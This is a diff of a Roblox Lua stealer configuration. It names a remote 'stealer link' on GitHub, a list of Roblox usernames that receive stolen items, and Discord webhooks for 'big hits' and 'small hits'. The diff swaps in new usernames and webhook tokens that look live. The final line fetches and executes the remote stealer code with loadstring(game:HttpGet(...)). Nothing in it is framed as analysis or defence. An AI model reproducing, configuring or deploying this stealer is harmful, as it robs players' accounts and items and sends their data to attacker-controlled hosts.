@@ -1,12 +1,12 @@
 STEALER_LINK = 'https://raw.githubusercontent.com/Fluxusoffcial2/Mateorizs/refs/heads/main/Script' -- stealer link (how to create is bellow)
 
 Usernames = {
-    'kikoshuriko123', -- PUT UR ROBLOX USERNAMES
-    'kikoshuriko123', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'dianari57581', -- PUT UR ROBLOX USERNAMES
+    'dianari57581', -- AS MANY AS U WANT BUT DONT FORGET ,
     'third',
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1274327407205023764/_YdpgdeOIA07EdxudB2loKcj4F6VLefx1lS6clloGa0KQk9_VrKhUTB1NHXK6Ryo5DQ8"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1274327407205023764/_YdpgdeOIA07EdxudB2loKcj4F6VLefx1lS6clloGa0KQk9_VrKhUTB1NHXK6Ryo5DQ8"
+BigHitsWebhook = "https://discord.com/api/webhooks/1274327417661427803/jdJtCPEHM1llHCPGIOrHDPddbRIBMt3Sah_payVd8oL1Ivbt-Sxf_dReS1rnjgIjcvmp"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1274327417661427803/jdJtCPEHM1llHCPGIOrHDPddbRIBMt3Sah_payVd8oL1Ivbt-Sxf_dReS1rnjgIjcvmp"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
